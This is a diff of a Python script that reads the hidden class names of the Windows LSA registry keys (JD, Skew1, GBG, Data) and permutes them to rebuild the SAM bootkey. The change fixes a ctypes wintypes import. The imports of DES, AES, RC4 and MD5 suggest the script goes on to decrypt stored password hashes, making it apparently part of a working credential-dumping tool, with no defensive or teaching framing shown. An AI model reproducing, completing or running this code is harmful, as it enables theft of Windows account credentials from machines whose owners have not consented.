@@ -3,6 +3,7 @@ import struct
 from Crypto.Cipher import AES, DES, ARC4
 from Crypto.Hash import MD5
 import ctypes
+from ctypes import wintypes
 
 def str_to_key(s):
     out = bytearray()
@@ -16,7 +17,7 @@ class_name = ""
 for key in ["JD", "Skew1", "GBG", "Data"]:
     h = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Lsa\\"+key)
     buf = ctypes.create_unicode_buffer(1024)
-    if not ctypes.windll.advapi32.RegQueryInfoKeyW(h.handle, buf, ctypes.byref(ctypes.wintypes.DWORD(1024)), *[None]*9):
+    if not ctypes.windll.advapi32.RegQueryInfoKeyW(h.handle, buf, ctypes.byref(wintypes.DWORD(1024)), *[None]*9):
         class_name += buf.value
 bootkey = bytes([bytes.fromhex(class_name)[i] for i in [8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7]])
 
